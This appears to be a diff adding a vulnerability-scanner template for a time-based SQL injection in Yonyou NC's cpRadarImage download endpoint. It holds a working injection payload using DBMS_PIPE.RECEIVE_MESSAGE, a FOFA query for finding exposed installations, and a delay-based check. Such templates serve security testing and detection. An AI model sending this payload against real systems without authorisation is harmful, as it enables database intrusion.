@@ -1,0 +1,17 @@
+id: poc-yaml-yongyou-nc-cpradarimage-sqli
+info:
+  name: 用友NC cpRadarImage SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /portal/pt/cpRadarImage/download?object_id=1&object_type=1&pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{.t1}})--&size=0
+  expression: status_code == 200 && contains(content_type,"image/png") && duration
+    > t1 && duration < t2
+transport: http
